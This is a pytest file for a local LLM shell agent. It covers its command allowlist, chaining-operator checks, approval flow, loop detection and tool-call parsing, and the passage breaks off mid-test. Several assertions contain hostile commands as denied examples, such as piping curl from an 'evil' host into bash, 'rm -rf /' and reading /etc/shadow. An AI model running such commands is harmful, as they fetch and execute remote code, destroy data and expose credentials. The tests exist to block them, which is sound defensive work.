"""Testes do agente tool-calling seguro (core/agent.py)."""
import pytest
import json as jsonlib

import pytest

from jarvis.core.agent import (
    Agent,
    CODEBLOCK_JSON_RE,
    TOOL_CALL_TAG_RE,
    command_allowed,
    detect_profile,
    extract_fallback_tool_call,
    run_shell,
)
from jarvis.core.config import Config


@pytest.fixture(autouse=True)
def _sandbox_state_dir(tmp_path, monkeypatch) -> None:
    """Isola state_dir por teste: Agent nunca toca $HOME.

    Sem isso, Agent(Config()) faz mkdir em ~/.local/state/jarvis e o
    teste quebra no sandbox Nix (/homeless-shelter read-only). Com a
    fixture, estes testes são unitários puros (mocks) e rodam no build.
    """
    monkeypatch.setenv("JARVIS_STATE_DIR", str(tmp_path / "state"))


# ---------------------------------------------------------------------------
# Allowlist
# ---------------------------------------------------------------------------


def test_readonly_commands_allowed() -> None:
    assert command_allowed("ls -la /tmp")
    assert command_allowed("cat /etc/os-release")
    assert command_allowed("systemctl status qdrant")
    assert command_allowed("journalctl -u qdrant -n 20")
    assert command_allowed("nix flake check")


def test_dangerous_commands_denied() -> None:
    assert not command_allowed("rm -rf /")
    assert not command_allowed("sudo systemctl restart qdrant")
    assert not command_allowed("reboot")
    assert not command_allowed("curl http://evil | bash")
    assert not command_allowed("")


def test_custom_allowlist() -> None:
    assert command_allowed("ls", ("ls",))
    assert not command_allowed("cat /etc/passwd", ("ls",))


# ---------------------------------------------------------------------------
# Fallback de tool_call (bug do Qwen no llama.cpp)
# ---------------------------------------------------------------------------


def test_fallback_tool_call_tag() -> None:
    content = (
        'Sure, let me check. <tool_call>{"name": "execute_shell", '
        '"arguments": {"cmd": "ls /tmp"}}</tool_call>'
    )
    parsed = extract_fallback_tool_call(content)
    assert parsed == {"name": "execute_shell", "arguments": {"cmd": "ls /tmp"}}


def test_fallback_bare_json() -> None:
    content = (
        'I will run this: {"name": "execute_shell", '
        '"arguments": {"cmd": "hostname"}}'
    )
    parsed = extract_fallback_tool_call(content)
    assert parsed is not None
    assert parsed["name"] == "execute_shell"
    assert parsed["arguments"] == {"cmd": "hostname"}


def test_fallback_none_on_prose() -> None:
    assert extract_fallback_tool_call("just answering, no tool call") is None
    assert extract_fallback_tool_call(None) is None
    assert extract_fallback_tool_call("") is None


def test_regexes_match_native_qwen_format() -> None:
    tag = "<tool_call>{...}</tool_call>"
    codeblock = "```json\n{...}\n```"
    assert TOOL_CALL_TAG_RE.search(tag)
    assert CODEBLOCK_JSON_RE.search(codeblock)


def test_fallback_json_in_codeblock() -> None:
    """O Qwen devolve o tool_call como JSON dentro de ```json (observado real)."""
    content = (
        '```json\n{\n  "name": "nix",\n  "arguments": {\n'
        '    "action": "search",\n    "query": "qdrant",\n'
        '    "type": "options"\n  }\n}\n```'
    )
    parsed = extract_fallback_tool_call(content)
    assert parsed is not None
    assert parsed["name"] == "nix"
    assert parsed["arguments"] == {"action": "search", "query": "qdrant", "type": "options"}


def test_fallback_nested_arguments_bare() -> None:
    """JSON solto com arguments aninhado (o regex antigo falhava aqui)."""
    content = (
        'The result is: {"name": "nix_versions", '
        '"arguments": {"package": "python", "limit": 3}} thanks'
    )
    parsed = extract_fallback_tool_call(content)
    assert parsed is not None
    assert parsed["name"] == "nix_versions"
    assert parsed["arguments"] == {"package": "python", "limit": 3}


# ---------------------------------------------------------------------------
# Perfis adaptativos
# ---------------------------------------------------------------------------


def test_detect_profile() -> None:
    assert detect_profile("qwen2.5-coder-7b-instruct")["name"] == "small"
    assert detect_profile("qwen2.5-coder-32b-instruct")["name"] == "large"
    assert detect_profile("anything-else")["name"] == "default"
    assert detect_profile("")["name"] == "default"


# ---------------------------------------------------------------------------
# run_shell
# ---------------------------------------------------------------------------


def test_run_shell_simple() -> None:
    res = run_shell("echo hello")
    assert res.returncode == 0
    assert res.stdout.strip() == "hello"


def test_run_shell_failure() -> None:
    res = run_shell("ls /definitely/not/a/real/path-xyz")
    assert res.returncode != 0


# ---------------------------------------------------------------------------
# Loop do agente com servidor mockado
# ---------------------------------------------------------------------------


class FakeResponse:
    def __init__(self, payload, status_code=200):
        self._payload = payload
        self.status_code = status_code

    def raise_for_status(self):
        if self.status_code != 200:
            raise RuntimeError(f"HTTP {self.status_code}")

    def json(self):
        return self._payload


class FakeSession:
    """Servidor OpenAI-compatível simulado: executa 1 tool e responde."""

    def __init__(self, tool_output="stdout fake"):
        self.tool_output = tool_output
        self.calls = 0

    def get(self, url, timeout=5):
        return FakeResponse({"data": [{"id": "qwen2.5-coder-7b-instruct"}]})

    def post(self, url, json=None, timeout=120, **kw):
        self.calls += 1
        assert "chat/completions" in url
        if self.calls == 1:
            # turn 1: chama execute_shell
            msg = {
                "role": "assistant",
                "content": "",
                "tool_calls": [{
                    "id": "call-1",
                    "type": "function",
                    "function": {
                        "name": "execute_shell",
                        "arguments": jsonlib.dumps({"cmd": "echo hello"}),
                    },
                }],
            }
        else:
            # turn 2: responde com base no output da tool
            msg = {"role": "assistant", "content": f"done: {self.tool_output}"}
        return FakeResponse({"choices": [{"message": msg}]})


def test_agent_injects_past_lessons_into_system_prompt(tmp_path) -> None:
    """Porta do cascade_planner do legado: lessons viram restrições obrigatórias."""
    class LessonMemory:
        def lessons(self, query, *, top_k=3):
            return (
                "\nPAST LESSONS (avoid these mistakes):\n"
                "- When task was 'fix qdrant', error 'unknown variant on_disk' "
                "was fixed with:\nrm -rf storage e recriar\n"
            )

    class LessonSession(FakeSession):
        last_payload = {}

        def post(self, url, json=None, timeout=120, **kw):
            LessonSession.last_payload = json or {}
            return super().post(url, json=json, timeout=timeout)

    cfg = Config()
    agent = Agent(cfg, session=LessonSession(), memory=LessonMemory())
    agent.run("arrume o qdrant")

    system = LessonSession.last_payload["messages"][0]["content"]
    assert "AVOID (past errors):" in system
    assert "PAST LESSONS (avoid these mistakes)" in system
    assert "unknown variant on_disk" in system


def test_agent_without_memory_has_no_lessons_block(tmp_path) -> None:
    class ProbeSession(FakeSession):
        last_payload = {}

        def post(self, url, json=None, timeout=120, **kw):
            ProbeSession.last_payload = json or {}
            return super().post(url, json=json, timeout=timeout)

    cfg = Config()
    agent = Agent(cfg, session=ProbeSession())
    agent.run("checagem")

    system = ProbeSession.last_payload["messages"][0]["content"]
    assert "AVOID" not in system


def test_agent_loop_executes_tool(tmp_path) -> None:
    cfg = Config()
    agent = Agent(cfg, session=FakeSession("fake-output"))
    result = agent.run("check the system")
    assert result.commands_run == ["echo hello"]
    assert result.commands_denied == []
    assert result.final_response == "done: fake-output"
    assert result.turns == 2


def test_agent_writes_audit_log(tmp_path) -> None:
    cfg = Config()
    audit = tmp_path / "audit.jsonl"
    agent = Agent(cfg, session=FakeSession(), audit_path=audit)
    agent.run("check")
    assert audit.exists()
    lines = audit.read_text().strip().splitlines()
    assert len(lines) == 1
    entry = jsonlib.loads(lines[0])
    assert entry["cmd"] == "echo hello"
    assert entry["allowed"] is True
    assert entry["approved"] is False


def test_agent_loop_detector_stops_repeated_tool_call(tmp_path) -> None:
    """REPL path: identical tool call repeated 3x triggers the loop detector
    warning, and a second warning (model ignoring it) stops the loop."""
    class RepeatSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            RepeatSession.last_payload = json or {}
            msg = {
                "role": "assistant",
                "content": "",
                "tool_calls": [{
                    "id": f"call-{self.calls}",
                    "type": "function",
                    "function": {
                        "name": "execute_shell",
                        "arguments": jsonlib.dumps({"cmd": "echo loop"}),
                    },
                }],
            }
            return FakeResponse({"choices": [{"message": msg}]})

    RepeatSession.last_payload = {}
    cfg = Config()
    agent = Agent(cfg, session=RepeatSession())
    result = agent.run("repeat forever")
    # 3rd identical call → duplicate warning injected; 4th call → cycle
    # detector (A→A→A→A) fires → forced stop before burning MAX_TURNS (8).
    # Without the loop detector this would execute 8 identical commands.
    assert result.turns == 4
    assert result.commands_run == ["echo loop"] * 3
    # The warning reached the LLM in the message history
    sys_msgs = [
        m["content"] for m in RepeatSession.last_payload["messages"]
        if m.get("role") == "system"
    ]
    assert any("repeated" in s or "Cycle detected" in s for s in sys_msgs)


def test_agent_loop_detector_does_not_fire_on_progress(tmp_path) -> None:
    """Normal multi-turn flow (different commands) never triggers warnings."""
    class ProgressSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            if self.calls <= 2:
                msg = {
                    "role": "assistant",
                    "content": "",
                    "tool_calls": [{
                        "id": f"call-{self.calls}",
                        "type": "function",
                        "function": {
                            "name": "execute_shell",
                            "arguments": jsonlib.dumps({"cmd": f"echo step{self.calls}"}),
                        },
                    }],
                }
            else:
                msg = {"role": "assistant", "content": "finished"}
            return FakeResponse({"choices": [{"message": msg}]})

    cfg = Config()
    agent = Agent(cfg, session=ProgressSession())
    result = agent.run("do progressive work")
    assert result.commands_run == ["echo step1", "echo step2"]
    assert result.final_response == "finished"
    assert result.turns == 3


def test_agent_denies_side_effect_without_approve(tmp_path) -> None:
    class DenySession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            if self.calls == 1:
                msg = {
                    "role": "assistant",
                    "content": "",
                    "tool_calls": [{
                        "id": "call-1",
                        "type": "function",
                        "function": {
                            "name": "execute_shell",
                            "arguments": jsonlib.dumps({"cmd": "sudo reboot"}),
                        },
                    }],
                }
            else:
                msg = {"role": "assistant", "content": "final"}
            return FakeResponse({"choices": [{"message": msg}]})

    cfg = Config()
    agent = Agent(cfg, session=DenySession())
    result = agent.run("reboot the machine")
    assert result.commands_run == []
    assert "sudo reboot" in result.commands_denied


def test_agent_recovers_fallback_tool_call(tmp_path) -> None:
    class FallbackSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            if self.calls == 1:
                # vaza tool_call como texto puro (bug do Qwen)
                msg = {
                    "role": "assistant",
                    "content": (
                        'I will check. <tool_call>{"name": "execute_shell", '
                        '"arguments": {"cmd": "echo fallback-ok"}}</tool_call>'
                    ),
                }
            else:
                msg = {"role": "assistant", "content": "ok done"}
            return FakeResponse({"choices": [{"message": msg}]})

    cfg = Config()
    agent = Agent(cfg, session=FallbackSession())
    result = agent.run("echo?")
    assert result.commands_run == ["echo fallback-ok"]
    assert result.final_response == "ok done"


def test_agent_approval_grants_side_effect(tmp_path, monkeypatch) -> None:
    class EffectSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            if self.calls == 1:
                msg = {
                    "role": "assistant",
                    "content": "",
                    "tool_calls": [{
                        "id": "call-1",
                        "type": "function",
                        "function": {
                            "name": "execute_shell",
                            "arguments": jsonlib.dumps({"cmd": "touch /tmp/jarvis-test-file"}),
                        },
                    }],
                }
            else:
                msg = {"role": "assistant", "content": "executed"}
            return FakeResponse({"choices": [{"message": msg}]})

    monkeypatch.setattr("jarvis.core.agent.human_approve", lambda cmd: True)
    cfg = Config()
    agent = Agent(cfg, session=EffectSession(), approve=True)
    result = agent.run("create a file")
    assert "touch /tmp/jarvis-test-file" in result.commands_run


def test_agent_approval_rejects(tmp_path, monkeypatch) -> None:
    class EffectSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            if self.calls == 1:
                msg = {
                    "role": "assistant",
                    "content": "",
                    "tool_calls": [{
                        "id": "call-1",
                        "type": "function",
                        "function": {
                            "name": "execute_shell",
                            "arguments": jsonlib.dumps({"cmd": "touch /tmp/x"}),
                        },
                    }],
                }
            else:
                msg = {"role": "assistant", "content": "final"}
            return FakeResponse({"choices": [{"message": msg}]})

    monkeypatch.setattr("jarvis.core.agent.human_approve", lambda cmd: False)
    cfg = Config()
    agent = Agent(cfg, session=EffectSession(), approve=True)
    result = agent.run("touch a file")
    assert result.commands_run == []
    assert "touch /tmp/x" in result.commands_denied


def test_agent_ignores_malformed_tool_calls() -> None:
    class MixedFormatSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            if self.calls == 1:
                msg = {
                    "role": "assistant",
                    "content": "",
                    "tool_calls": [
                        {"name": "execute_shell", "arguments": {"cmd": "echo ok"}},
                        {"function": {"name": "broken_tool", "arguments": "{bad json"}},
                    ],
                }
            else:
                msg = {"role": "assistant", "content": "done"}
            return FakeResponse({"choices": [{"message": msg}]})

    cfg = Config()
    agent = Agent(cfg, session=MixedFormatSession())
    result = agent.run("check shell")
    assert result.commands_run == ["echo ok"]
    assert result.final_response == "done"


# ---------------------------------------------------------------------------
# MCP: `{server}_query` NÃO anunciado sem dispatch no loop (ver teste
# test_agent_does_not_advertise_undispatched_mcp_tools acima).
# ---------------------------------------------------------------------------


def test_agent_does_not_advertise_undispatched_mcp_tools(tmp_path) -> None:
    """`{server}_query` sem dispatch no loop = armadilha de erro garantido
    (L8 real: nixos_query → 'Unknown tool', turno queimado). Não anunciar
    até haver dispatch real p/ MCPClient; execute_shell continua."""
    import sys

    class CapMCP(FakeSession):
        last_payload = {}

        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            CapMCP.last_payload = json or {}
            msg = {"role": "assistant", "content": "done"}
            return FakeResponse({"choices": [{"message": msg}]})

    agent = Agent(
        Config(),
        session=CapMCP(),
        mcp_servers={"fake": f"{sys.executable} /dev/null"},
        strict_tools=False,
    )
    agent.run("faça algo")
    sent_tools = [
        t["function"]["name"]
        for t in CapMCP.last_payload.get("tools", [])
    ]
    assert "fake_query" not in sent_tools
    assert "execute_shell" in sent_tools


def _tool_names_for(prompt):
    """Roda 1 turno capturando as tools oferecidas no payload."""
    import sys

    class Cap(FakeSession):
        last = {}

        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            Cap.last = json or {}
            msg = {"role": "assistant", "content": "done"}
            return FakeResponse({"choices": [{"message": msg}]})

    agent = Agent(Config(), session=Cap(), strict_tools=False)
    agent.run(prompt)
    return [t["function"]["name"] for t in Cap.last.get("tools", [])]


def test_book_tools_hidden_without_book_signals() -> None:
    """Sem sinal de livro/áudio: book_* fora da oferta (progressive)."""
    names = _tool_names_for("limpe o repo de chaves de API e troque valores")
    assert "book_search" not in names
    assert "book_resume" not in names
    assert "read_file" in names


def test_book_tools_shown_with_book_signals() -> None:
    """Com sinal ('leia o livro'): book_* oferecidas."""
    names = _tool_names_for("leia o livro hobbit capitulo 3")
    assert "book_search" in names
    assert "book_resume" in names


def test_execute_shell_description_bans_narration() -> None:
    """Descrição da shell proíbe narrar comando em vez de chamar.

    (fix-git real: modelo colava `git checkout/merge` em bloco bash pro
    usuário em vez de executar — prose blocks don't execute.)
    """
    import sys

    class CaptureTools(FakeSession):
        last_payload = {}

        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            CaptureTools.last_payload = json or {}
            msg = {"role": "assistant", "content": "done"}
            return FakeResponse({"choices": [{"message": msg}]})

    agent = Agent(
        Config(),
        session=CaptureTools(),
        mcp_servers={"fake": f"{sys.executable} /dev/null"},
        strict_tools=False,
    )
    agent.run("faça algo")
    tools = {t["function"]["name"]: t["function"]["description"]
             for t in CaptureTools.last_payload["tools"]}
    assert "DO NOT execute" in tools["execute_shell"]


# ---------------------------------------------------------------------------
# Security: chaining operator bypass
# ---------------------------------------------------------------------------


def test_secret_worked_example_uses_observed_values() -> None:
    """Valores observados + nome trocado → worked example de valor."""
    from jarvis.core.agent import _secret_worked_example
    msgs = [
        {"role": "assistant", "tool_calls": [
            {"function": {"name": "grep", "arguments": "{}"}}]},
        {"role": "tool", "content": "process.py: AKIA1234567890123456"},
        {"role": "assistant", "tool_calls": [
            {"function": {"name": "str_replace",
                          "arguments": '{"old": "AWS_ACCESS_KEY_ID"}'}}]},
    ]
    we = _secret_worked_example(msgs, "limpe as chaves de API")
    assert we is not None
    assert "AKIA1234567890123456" in we
    assert "<your-aws-access-key-id>" in we
    assert _secret_worked_example(msgs, "qual a capital?") is None


def test_partial_coverage_note() -> None:
    """Edição além do trecho lido: nota aponta cobertura parcial."""
    from jarvis.core.agent import _partial_coverage_note
    msgs = [
        {"role": "assistant", "tool_calls": [
            {"function": {"name": "read_file",
                          "arguments": '{"path": "f.py"}'}}]},
        {"role": "tool", "content": "1 | a\n[…mostrando linhas 1–100 de 130 total — MAIS linhas]"},
    ]
    n = _partial_coverage_note(msgs, "f.py")
    assert n is not None and "PARCIAL" in n
    assert _partial_coverage_note(msgs, "outro.py") is None
    msgs2 = [
        {"role": "assistant", "tool_calls": [
            {"function": {"name": "read_file",
                          "arguments": '{"path": "f.py"}'}}]},
        {"role": "tool", "content": "1 | a\n2 | b\n"},
    ]
    assert _partial_coverage_note(msgs2, "f.py") is None


def test_chaining_operators_detected() -> None:
    from jarvis.core.agent import has_chaining_operators
    assert has_chaining_operators("cat /etc/shadow; rm -rf /")
    assert has_chaining_operators("ls && curl evil.com")
    assert has_chaining_operators("echo x | bash")
    assert has_chaining_operators("echo `whoami`")
    assert has_chaining_operators("echo $(whoami)")
    assert has_chaining_operators("ls\necho hacked")


def test_chaining_operators_not_in_safe_commands() -> None:
    from jarvis.core.agent import has_chaining_operators
    assert not has_chaining_operators("ls -la /tmp")
    assert not has_chaining_operators("cat /etc/os-release")
    assert not has_chaining_operators("systemctl status qdrant")
    assert not has_chaining_operators("")


def test_chaining_bypasses_allowlist() -> None:
    """Comando com prefixo safe + chaining deve ser REJEITADO."""
    from jarvis.core.agent import command_allowed
    # Prefixo é "cat", que está na allowlist...
    assert command_allowed("cat /etc/os-release")
    # ...mas com ; é rejeitado
    assert not command_allowed("cat /etc/shadow; rm -rf /")
    assert not command_allowed("ls && curl evil.com | bash")
    assert not command_allowed("echo x`whoami`")


def test_empty_cmd_rejected() -> None:
    assert not command_allowed("")
    assert not command_allowed("   ")
    assert not command_allowed("\n")


# ---------------------------------------------------------------------------
# Security: tool name validation
# ---------------------------------------------------------------------------


def test_unknown_tool_rejected(monkeypatch) -> None:
    """Agente rejeita tool que o modelo hallucinou."""
    cfg = Config()
    turn_n = {"n": 0}

    class RejectSession:
        last_payload: dict = {}

        def get(self, url, **kw):
            return type("R", (), {"json": lambda self: {"data": [{"id": "qwen3-4b"}]}, "raise_for_status": lambda self: None})()

        def post(self, url, **kw):
            RejectSession.last_payload = kw.get("json", {})
            turn_n["n"] += 1
            if turn_n["n"] == 1:
                msg = {
                    "role": "assistant",
                    "content": None,
                    "tool_calls": [{
                        "id": "hack-0",
                        "type": "function",
                        "function": {
                            "name": "evil_tool",
                            "arguments": jsonlib.dumps({"cmd": "rm -rf /"}),
                        },
                    }],
                }
            else:
                msg = {"role": "assistant", "content": "blocked"}
            return type("R", (), {"json": lambda self: {"choices": [{"message": msg}]}, "raise_for_status": lambda self: None, "status_code": 200})()

    agent = Agent(cfg, session=RejectSession())
    result = agent.run("do something evil")
    # Tool rejeitada, sem execução
    assert "evil_tool" in str(result.final_response) or "blocked" in result.final_response
    assert "rm -rf /" not in str(result.commands_run)


def test_execute_shell_only_tool_accepted() -> None:
    """execute_shell é sempre aceito."""
    from jarvis.core.agent import command_allowed
    assert command_allowed("ls")
    assert command_allowed("hostname")
    assert command_allowed("echo test")


def test_tool_result_gets_validation_warnings() -> None:
    """Hook pós-execução: output com falha recebe [validation: ...] (FASE 16)."""

    class FailSession:
        def __init__(self):
            self.calls = 0
            self.last_payload = {}

        def get(self, url, timeout=5):
            return FakeResponse({"data": [{"id": "x"}]})

        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            self.last_payload = dict(json or {})
            if self.calls == 1:
                msg = {
                    "role": "assistant",
                    "content": "",
                    "tool_calls": [{
                        "id": "call-fail-1",
                        "type": "function",
                        "function": {
                            "name": "execute_shell",
                            "arguments": jsonlib.dumps({"cmd": "cat /nao/existe-xyz-123"}),
                        },
                    }],
                }
            else:
                msg = {"role": "assistant", "content": "falhou como esperado"}
            return FakeResponse({"choices": [{"message": msg}]})

    probe = FailSession()
    agent = Agent(Config(), session=probe)
    result = agent.run("leia arquivo inexistente via shell")
    assert result.turns >= 2
    tool_msgs = [m for m in probe.last_payload["messages"] if m.get("role") == "tool"]
    assert tool_msgs, "esperava tool result no segundo turno"
    assert "[validation:" in tool_msgs[0]["content"]


def test_context_overflow_stops_loop_early() -> None:
    """Guard de budget: estouro interrompe o loop com nota (FASE 13)."""

    class LoopForeverSession:
        def __init__(self):
            self.calls = 0

        def get(self, url, timeout=5):
            return FakeResponse({"data": [{"id": "x"}]})

        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            msg = {
                "role": "assistant",
                "content": "",
                "tool_calls": [{
                    "id": f"call-{self.calls}",
                    "type": "function",
                    "function": {
                        "name": "execute_shell",
                        "arguments": jsonlib.dumps({"cmd": "echo x"}),
                    },
                }],
            }
            return FakeResponse({"choices": [{"message": msg}]})

    agent = Agent(Config(), session=LoopForeverSession())
    agent.context_budget.max_tokens = 100  # força overflow imediato
    result = agent.run("loop infinito")
    assert result.turns == 1
    assert "Context budget overflow" in result.final_response


def test_lessons_recall_uses_prompt_not_empty_query() -> None:
    """Recall de lições é qualificado pelo prompt (FASE 20/21).

    lessons("") embaralha por embedding vazio; o Agent deve passar o
    prompt para trazer lições relevantes à tarefa atual.
    """
    seen: dict[str, str] = {}

    class QueryRecordingMemory:
        def lessons(self, query: str, *, top_k: int = 3) -> str:
            seen["query"] = query
            return ""

    agent = Agent(Config(), session=FakeSession("ok"), memory=QueryRecordingMemory())
    agent.run("consertar o qdrant que caiu")
    assert seen.get("query") == "consertar o qdrant que caiu"


def test_agent_tool_timeout_becomes_observation(tmp_path, monkeypatch) -> None:
    """Timeout de tool vira observation — run() não aborta (integração E).

    Regressão: run_shell() levantava TimeoutExpired sem try, matando o
    run() inteiro sem final_response nem audit.
    """
    import subprocess
    from unittest.mock import patch

    session = FakeSession("nunca-veremos")
    seen_payloads: list = []
    _orig_post = session.post

    def _capture(url, json=None, timeout=120, **kw):
        seen_payloads.append(json)
        return _orig_post(url, json=json, timeout=timeout, **kw)

    session.post = _capture
    agent = Agent(Config(), session=session,
                  audit_path=tmp_path / "audit.jsonl")

    def _boom(cmd, timeout=60):
        raise subprocess.TimeoutExpired(cmd, timeout)

    with patch("jarvis.core.agent.run_shell", side_effect=_boom):
        result = agent.run("check")

    assert result.commands_run == ["echo hello"]
    assert result.turns > 2  # P0.2: texto "done" sobre tool com erro NÃO é
    # DONE — consome turnos de verificação e fecha UNVERIFIED honesto.
    assert result.verified is False
    assert result.verdict == "UNVERIFIED"
    assert any("ground truth" in m for m in result.missing)
    # A observation de timeout chegou às mensagens do turno 2.
    turn2_text = jsonlib.dumps(seen_payloads[1])
    assert "timed out" in turn2_text
    lines = (tmp_path / "audit.jsonl").read_text().strip().splitlines()
    assert len(lines) == 1
    assert jsonlib.loads(lines[0])["exit_code"] == -1


def test_agent_max_turns_read_at_runtime(tmp_path, monkeypatch) -> None:
    """JARVIS_AGENT_MAX_TURNS vale no runtime (não congelado no import)."""
    session = FakeSession("x")
    agent = Agent(Config(), session=session)
    monkeypatch.setenv("JARVIS_AGENT_MAX_TURNS", "1")
    result = agent.run("check")
    assert result.turns == 1


def test_agent_uses_reasoning_when_content_empty(tmp_path) -> None:
    """Modelo thinking sem content: loop recebe reasoning (nunca vazio)."""
    from jarvis.providers.llm_backend import ChatResponse

    cfg = Config()
    agent = Agent(cfg, session=FakeSession("x"))
    agent.llm = _ReasoningOnlyClient()
    msg = agent._get_llm_response([{"role": "user", "content": "oi"}])
    assert "[thinking]" in msg["content"]
    assert "passo" in msg["content"]


class _ReasoningOnlyClient:
    def chat_with_tools(self, *a, **k):
        from jarvis.providers.llm_backend import ChatResponse
        return ChatResponse(content="", reasoning="passo 1: penso")


def test_agent_strict_tools_converts_json_to_calls(tmp_path) -> None:
    """strict_tools: content JSON vira tool_calls; payload sem tools + schema."""
    import json as jsonlib
    from jarvis.providers.llm_backend import ChatResponse

    seen = {}

    class StrictSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            seen.setdefault("payloads", []).append(json)
            msg = {"role": "assistant",
                   "content": jsonlib.dumps(
                       {"tool": "read_file", "arguments": {"path": "/x"}})}
            return FakeResponse({"choices": [{"message": msg}]})

    agent = Agent(Config(), session=StrictSession(), strict_tools=True)
    result = agent.run("leia /x")
    first = seen["payloads"][0]
    assert "tools" not in first
    assert first["response_format"]["type"] == "json_schema"
    # read_file canônica executou de verdade (arquivo inexistente → erro honesto)
    assert result.turns >= 1


def test_agent_strict_tools_rejects_unknown_tool() -> None:
    """strict_tools: tool fora do set vira texto, nunca call inventada."""
    from jarvis.core.agent import Agent
    from jarvis.providers.llm_backend import ChatResponse

    agent = Agent(Config(), session=FakeSession("x"))
    resp = ChatResponse(content='{"tool": "rm_rf", "arguments": {}}')
    out = Agent._strict_to_response(
        resp, [{"type": "function", "function": {"name": "read_file"}}])
    assert out.tool_calls == []
    assert "rm_rf" in out.content


def test_agent_repairs_truncated_tool_args(tmp_path) -> None:
    """args JSON inválido (truncado no max_tokens, L8 real): run não
    crasha e o servidor nunca recebe a mensagem malformada (era 500)."""
    import json as jsonlib

    seen = []

    class TruncSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            seen.append(json)
            if len(seen) == 1:
                msg = {"role": "assistant", "content": "",
                       "tool_calls": [{
                           "id": "call-1", "type": "function",
                           "function": {
                               "name": "write_file",
                               "arguments": '{"path": "/x", "content": "TRUNCADO',
                           }}]}
            else:
                msg = {"role": "assistant", "content": "done: /x"}
            return FakeResponse({"choices": [{"message": msg}]})

    agent = Agent(Config(), session=TruncSession())
    result = agent.run("escreve /x")
    assert result.turns >= 2
    # Hint codificado chegou ao payload do turno 2.
    assert "malformed_tool_args" in jsonlib.dumps(seen[1])
    # Nenhum payload enviado contém args inválidos.
    for p in seen:
        for m in p["messages"]:
            if m.get("role") == "assistant":
                for tc in (m.get("tool_calls") or []):
                    jsonlib.loads(tc["function"]["arguments"])


def test_agent_success_output_with_error_keywords_is_ok(tmp_path, monkeypatch) -> None:
    """stdout com keywords de erro + exit 0 é SUCESSO (L8 real: grep em
    auth.log contém 'not allowed'; conteúdo ≠ falha)."""
    import json as jsonlib

    class EchoSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            if self.calls == 1:
                msg = {"role": "assistant", "content": "",
                       "tool_calls": [{
                           "id": "c1", "type": "function",
                           "function": {
                               "name": "execute_shell",
                               "arguments": jsonlib.dumps(
                                   {"cmd": "echo 'command not allowed here'"}),
                           }}]}
            else:
                msg = {"role": "assistant", "content": "done"}
            return FakeResponse({"choices": [{"message": msg}]})

    monkeypatch.setattr("jarvis.core.agent.human_approve", lambda cmd: True)
    agent = Agent(Config(), session=EchoSession(), approve=True)
    result = agent.run("echo test")
    assert result.steps[0]["ok"] is True
    assert result.steps[0]["kind"] == "ok"


def test_strict_to_response_preserves_finish_reason() -> None:
    """strict: finish_reason sobrevive à conversão (truncamento detectável)."""
    from jarvis.core.agent import Agent
    from jarvis.providers.llm_backend import ChatResponse
    resp = ChatResponse(
        content='{"tool": "read_file", "arguments": {"path": "/x"}}',
        finish_reason="length")
    out = Agent._strict_to_response(
        resp, [{"type": "function", "function": {"name": "read_file"}}])
    assert out.tool_calls and out.finish_reason == "length"


def test_agent_truncation_note_on_length_finish(tmp_path) -> None:
    """finish_reason=length (ironclaw/2026): nota tipada p/ dividir em
    partes; run sobrevive sem crash."""
    import json as jsonlib

    seen = []

    class LengthSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            seen.append(json)
            if len(seen) == 1:
                msg = {"role": "assistant", "content": "partial"}
                fr = "length"
            else:
                msg = {"role": "assistant", "content": "done"}
                fr = "stop"
            return FakeResponse(
                {"choices": [{"message": msg, "finish_reason": fr}]})

    agent = Agent(Config(), session=LengthSession())
    result = agent.run("diga oi")
    assert result.turns >= 2
    assert "truncated_output" in jsonlib.dumps(seen[1])


def test_agent_truncation_escalates_after_3(tmp_path) -> None:
    """3 cortes seguidos: ESCALATION força plano em prosa, sem tools."""
    import json as jsonlib

    seen = []

    class Length3Session(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            seen.append(json)
            if len(seen) <= 3:
                msg = {"role": "assistant",
                       "content": f"partial {len(seen)}"}
                fr = "length"
            else:
                msg = {"role": "assistant", "content": "done"}
                fr = "stop"
            return FakeResponse(
                {"choices": [{"message": msg, "finish_reason": fr}]})

    agent = Agent(Config(), session=Length3Session())
    agent.run("diga oi")
    blob = jsonlib.dumps(seen)
    assert "streak=3" in blob
    assert "ESCALATION" in blob


def test_book_gate_ignores_generic_read_verbs() -> None:
    """'deve ler logs' NÃO é task de livro (L8 real: book_search em task
    shell por causa de 'ler '). Só marcadores específicos abrem."""
    names = _tool_names_for("deve ler logs/auth.log e http.log com detecção")
    assert "book_search" not in names
    assert "book_resume" not in names


def _tc_msg(name, args):
    import json as _j
    return {"role": "assistant", "content": "",
            "tool_calls": [{"id": "c1", "type": "function",
                            "function": {"name": name, "arguments": _j.dumps(args)}}]}


def test_unexecuted_script_note_fires() -> None:
    """write .sh sem run → nota EXECUTE com o path."""
    from jarvis.core.agent import _unexecuted_script_note
    msgs = [{"role": "user", "content": "x"},
            _tc_msg("write_file", {"path": "det.sh", "content": "echo"})]
    note = _unexecuted_script_note(msgs)
    assert note and "det.sh" in note and "execute NOW" in note


def test_unexecuted_script_note_silent_when_run() -> None:
    """write + ./run → sem nota."""
    from jarvis.core.agent import _unexecuted_script_note
    msgs = [{"role": "user", "content": "x"},
            _tc_msg("write_file", {"path": "det.sh", "content": "echo"}),
            _tc_msg("execute_shell", {"cmd": "./det.sh"})]
    assert _unexecuted_script_note(msgs) is None


def test_unexecuted_script_note_chmod_does_not_count() -> None:
    """chmod prepara, não executa: nota continua devida."""
    from jarvis.core.agent import _unexecuted_script_note
    msgs = [{"role": "user", "content": "x"},
            _tc_msg("write_file", {"path": "det.sh", "content": "echo"}),
